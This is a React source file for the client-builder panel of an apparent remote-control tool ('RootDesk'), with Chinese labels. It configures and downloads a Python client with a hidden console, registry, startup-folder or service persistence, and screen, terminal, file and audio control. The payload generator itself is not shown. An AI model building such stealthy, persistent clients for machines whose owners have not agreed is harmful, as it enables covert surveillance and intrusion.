"use client"

import { useState } from "react"
import { 
  Download, 
  Save, 
  Code, 
  Shield, 
  Zap, 
  Settings, 
  CheckCircle2, 
  AlertTriangle,
  FileCode,
  Copy,
  Smartphone,
  Monitor
} from "lucide-react"
import { cn } from "@/lib/utils"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Switch } from "@/components/ui/switch"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Badge } from "@/components/ui/badge"
import { useNotification } from "@/components/ui/custom-notification"
import { generatePythonScript, type ClientConfig } from "@/lib/client-template"

export function BuilderPanel() {
  const { notify } = useNotification()
  const [config, setConfig] = useState<ClientConfig>({
    host: typeof window !== 'undefined' ? window.location.hostname : "127.0.0.1",
    port: typeof window !== 'undefined' ? window.location.port || "80" : "3000",
    remark: "RootDesk",
    autoStart: "none",
    reconnectInterval: 5,
    hideConsole: true,
    appUrl: typeof window !== 'undefined' ? window.location.origin : "",
    encryptionKey: "dGVzdF9rZXlfMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI=",
    singleInstance: true,
    installAsService: false,
    protocol: typeof window !== 'undefined' && window.location.protocol === 'https:' ? "wss" : "ws",
    modules: {
      screen: true,
      terminal: true,
      files: true,
      windows: true,
      monitor: true,
      audio: true
    },
    platform: "pc"
  })

  const [generatedCode, setGeneratedCode] = useState("")

  const handleGenerate = () => {
    const code = generatePythonScript(config)
    setGeneratedCode(code)
    notify({
      title: "生成成功",
      message: "客户端代码已生成，请下载或复制。",
      type: "success"
    })
  }

  const handleDownload = () => {
    if (!generatedCode) return
    const blob = new Blob([generatedCode], { type: "text/x-python" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = "client.py"
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
    notify({
      title: "下载开始",
      message: "client.py 已开始下载",
      type: "success"
    })
  }

  const fallbackCopyTextToClipboard = (text: string) => {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    
    // Avoid scrolling to bottom
    textArea.style.top = "0";
    textArea.style.left = "0";
    textArea.style.position = "fixed";

    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
      const successful = document.execCommand('copy');
      if (successful) {
        notify({
          title: "已复制",
          message: "代码已复制到剪贴板",
          type: "success"
        })
      } else {
        notify({
          title: "复制失败",
          message: "请手动选择代码并复制",
          type: "error"
        })
      }
    } catch (err) {
      console.error('Fallback: Oops, unable to copy', err);
      notify({
        title: "复制失败",
        message: "请手动选择代码并复制",
        type: "error"
      })
    }

    document.body.removeChild(textArea);
  }

  const handleCopy = () => {
    if (!generatedCode) return
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(generatedCode).then(() => {
        notify({
          title: "已复制",
          message: "代码已复制到剪贴板",
          type: "success"
        })
      }).catch(err => {
        console.error('Failed to copy text: ', err)
        fallbackCopyTextToClipboard(generatedCode)
      })
    } else {
      fallbackCopyTextToClipboard(generatedCode)
    }
  }

  return (
    <div className="flex flex-col h-full bg-background">
      {/* Header */}
      <div className="flex items-center justify-between px-6 py-4 border-b border-border bg-card shrink-0">
        <div>
          <h2 className="text-lg font-semibold text-foreground">客户端生成器</h2>
          <p className="text-sm text-muted-foreground">配置并生成用于被控端的 Python 运行脚本</p>
        </div>
        <div className="flex items-center gap-2">
          <Button variant="outline" onClick={handleGenerate}>
            <Code className="mr-2 h-4 w-4" />
            生成代码
          </Button>
          <Button onClick={handleDownload} disabled={!generatedCode}>
            <Download className="mr-2 h-4 w-4" />
            下载 .py
          </Button>
        </div>
      </div>

      <div className="flex-1 overflow-hidden">
        <div className="flex flex-col lg:flex-row h-full">
          {/* Configuration Column */}
          <ScrollArea className="flex-1 min-h-0 border-r border-border bg-muted/30">
            <div className="p-6 space-y-8">
              {/* Platform Selection */}
              <section className="space-y-4">
                <div className="flex items-center gap-2 text-primary font-medium">
                  <Monitor className="h-4 w-4" />
                  <h3>目标平台</h3>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div 
                    className={cn(
                      "cursor-pointer rounded-lg border-2 p-4 flex flex-col items-center gap-2 transition-all hover:bg-accent",
                      config.platform === "pc" ? "border-primary bg-primary/5" : "border-transparent bg-card"
                    )}
                    onClick={() => setConfig({...config, platform: "pc"})}
                  >
                    <Monitor className={cn("h-8 w-8", config.platform === "pc" ? "text-primary" : "text-muted-foreground")} />
                    <span className="font-medium text-sm">PC (Windows/Linux/Mac)</span>
                  </div>
                  <div 
                    className={cn(
                      "cursor-pointer rounded-lg border-2 p-4 flex flex-col items-center gap-2 transition-all hover:bg-accent",
                      config.platform === "mobile" ? "border-primary bg-primary/5" : "border-transparent bg-card"
                    )}
                    onClick={() => setConfig({...config, platform: "mobile"})}
                  >
                    <Smartphone className={cn("h-8 w-8", config.platform === "mobile" ? "text-primary" : "text-muted-foreground")} />
                    <span className="font-medium text-sm">Mobile (Android Termux)</span>
                  </div>
                </div>
              </section>

              {/* Connection Settings */}
              <section className="space-y-4">
                <div className="flex items-center gap-2 text-primary font-medium">
                  <Zap className="h-4 w-4" />
                  <h3>连接配置</h3>
                </div>
                <Card>
                  <CardContent className="pt-6 grid gap-4">
                    <div className="grid grid-cols-4 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="protocol">协议</Label>
                        <Select 
                          value={config.protocol} 
                          onValueChange={(v: "ws" | "wss") => setConfig({...config, protocol: v})}
                        >
                          <SelectTrigger id="protocol">
                            <SelectValue placeholder="协议" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="ws">ws</SelectItem>
                            <SelectItem value="wss">wss</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="host">服务器 IP / 域名</Label>
                        <Input 
                          id="host" 
                          value={config.host}
                          onChange={(e) => setConfig({...config, host: e.target.value})}
                          placeholder="127.0.0.1" 
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="port">端口</Label>
                        <Input 
                          id="port" 
                          value={config.port}
                          onChange={(e) => setConfig({...config, port: e.target.value})}
                          placeholder="3000" 
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="encryptionKey">加密密钥 (Base64)</Label>
                        <Input 
                          id="encryptionKey" 
                          value={config.encryptionKey}
                          onChange={(e) => setConfig({...config, encryptionKey: e.target.value})}
                          placeholder="Base64 encoded key" 
                        />
                      </div>
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="remark">上线备注</Label>
                      <Input 
                        id="remark" 
                        value={config.remark}
                        onChange={(e) => setConfig({...config, remark: e.target.value})}
                        placeholder="例如：公司电脑-01" 
                      />
                      <p className="text-[11px] text-muted-foreground">设备上线时显示的名称标识</p>
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="reconnect">重连间隔 (秒)</Label>
                      <div className="flex items-center gap-4">
                        <Input 
                          id="reconnect" 
                          type="number"
                          value={config.reconnectInterval}
                          onChange={(e) => setConfig({...config, reconnectInterval: parseInt(e.target.value) || 5})}
                          className="w-24"
                        />
                        <span className="text-xs text-muted-foreground">断线后自动重试连接的时间间隔</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </section>

              {/* Startup & Persistence */}
              <section className="space-y-4">
                <div className="flex items-center gap-2 text-primary font-medium">
                  <Shield className="h-4 w-4" />
                  <h3>自启动与持久化</h3>
                </div>
                <Card>
                  <CardContent className="pt-6 grid gap-6">
                    <div className="space-y-3">
                      <Label>自启动方式</Label>
                      <Select 
                        value={config.autoStart} 
                        onValueChange={(v) => setConfig({...config, autoStart: v})}
                      >
                        <SelectTrigger>
                          <SelectValue placeholder="选择启动方式" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="none">不设置自启动</SelectItem>
                          {config.platform === "pc" && (
                            <>
                              <SelectItem value="registry">注册表 (HKCU Run)</SelectItem>
                              <SelectItem value="startup_folder">启动文件夹 (Startup Folder)</SelectItem>
                            </>
                          )}
                          {config.platform === "mobile" && (
                            <SelectItem value="termux_boot">Termux Boot (需安装插件)</SelectItem>
                          )}
                        </SelectContent>
                      </Select>
                      <div className="flex items-start gap-2 p-3 rounded-md bg-yellow-500/10 text-yellow-600 dark:text-yellow-400 text-xs">
                        <AlertTriangle className="h-4 w-4 shrink-0 mt-0.5" />
                        <p>注意：某些自启动方式可能会被杀毒软件拦截。建议在测试环境中使用。</p>
                      </div>
                    </div>

                    {config.platform === "pc" && (
                      <div className="space-y-4">
                        <div className="flex items-center justify-between space-x-2">
                          <div className="space-y-0.5">
                            <Label htmlFor="hide-console">隐藏控制台窗口</Label>
                            <p className="text-xs text-muted-foreground">运行时不显示命令行窗口 (仅 .pyw 或打包后有效)</p>
                          </div>
                          <Switch 
                            id="hide-console" 
                            checked={config.hideConsole}
                            onCheckedChange={(c) => setConfig({...config, hideConsole: c})}
                          />
                        </div>

                        <div className="flex items-center justify-between space-x-2">
                          <div className="space-y-0.5">
                            <Label htmlFor="single-instance">防止多开 (Single Instance)</Label>
                            <p className="text-xs text-muted-foreground">使用 Windows Mutex 确保只有一个实例运行</p>
                          </div>
                          <Switch 
                            id="single-instance" 
                            checked={config.singleInstance}
                            onCheckedChange={(c) => setConfig({...config, singleInstance: c})}
                          />
                        </div>

                        <div className="flex items-center justify-between space-x-2">
                          <div className="space-y-0.5">
                            <Label htmlFor="install-service">安装为 Windows 服务</Label>
                            <p className="text-xs text-muted-foreground">首次运行自动尝试注册为系统服务 (需管理员权限)</p>
                          </div>
                          <Switch 
                            id="install-service" 
                            checked={config.installAsService}
                            onCheckedChange={(c) => setConfig({...config, installAsService: c})}
                          />
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </section>

              {/* Modules */}
              <section className="space-y-4">
                <div className="flex items-center gap-2 text-primary font-medium">
                  <Settings className="h-4 w-4" />
                  <h3>功能模块</h3>
                </div>
                <Card>
                  <CardContent className="pt-6">
                    <div className="grid grid-cols-2 gap-4">
                      <div className="flex items-center space-x-2">
                        <Switch 
                          id="mod-screen" 
                          checked={config.modules.screen}
                          onCheckedChange={(c) => setConfig({...config, modules: {...config.modules, screen: c}})}
                        />
                        <Label htmlFor="mod-screen">屏幕监控</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Switch 
                          id="mod-terminal" 
                          checked={config.modules.terminal}
                          onCheckedChange={(c) => setConfig({...config, modules: {...config.modules, terminal: c}})}
                        />
                        <Label htmlFor="mod-terminal">远程终端</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Switch 
                          id="mod-files" 
                          checked={config.modules.files}
                          onCheckedChange={(c) => setConfig({...config, modules: {...config.modules, files: c}})}
                        />
                        <Label htmlFor="mod-files">文件管理</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Switch 
                          id="mod-windows" 
                          checked={config.modules.windows}
                          onCheckedChange={(c) => setConfig({...config, modules: {...config.modules, windows: c}})}
                        />
                        <Label htmlFor="mod-windows">窗口管理</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Switch 
                          id="mod-monitor" 
                          checked={config.modules.monitor}
                          onCheckedChange={(c) => setConfig({...config, modules: {...config.modules, monitor: c}})}
                        />
                        <Label htmlFor="mod-monitor">性能监控</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Switch 
                          id="mod-audio" 
                          checked={config.modules.audio}
                          onCheckedChange={(c) => setConfig({...config, modules: {...config.modules, audio: c}})}
                        />
                        <Label htmlFor="mod-audio">音频传输</Label>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </section>
            </div>
          </ScrollArea>

          {/* Preview Column */}
          <div className="flex-1 min-h-0 flex flex-col bg-[#1e1e1e] text-white overflow-hidden">
            <div className="flex items-center justify-between px-4 py-2 border-b border-[#333] bg-[#252526]">
              <div className="flex items-center gap-2 text-xs text-[#cccccc]">
                <FileCode className="h-4 w-4" />
                <span>client.py</span>
              </div>
              <Button variant="ghost" size="icon" className="h-6 w-6 text-[#cccccc] hover:text-white" onClick={handleCopy}>
                <Copy className="h-3.5 w-3.5" />
              </Button>
            </div>
            <ScrollArea className="flex-1">
              <div className="p-4">
                {generatedCode ? (
                  <pre className="font-mono text-xs leading-relaxed text-[#d4d4d4] whitespace-pre-wrap">
                    {generatedCode}
                  </pre>
                ) : (
                  <div className="flex flex-col items-center justify-center h-64 text-[#6e6e6e] gap-3">
                    <Code className="h-12 w-12 opacity-20" />
                    <p>点击左上角 "生成代码" 查看预览</p>
                  </div>
                )}
              </div>
            </ScrollArea>
          </div>
        </div>
      </div>
    </div>
  )
}
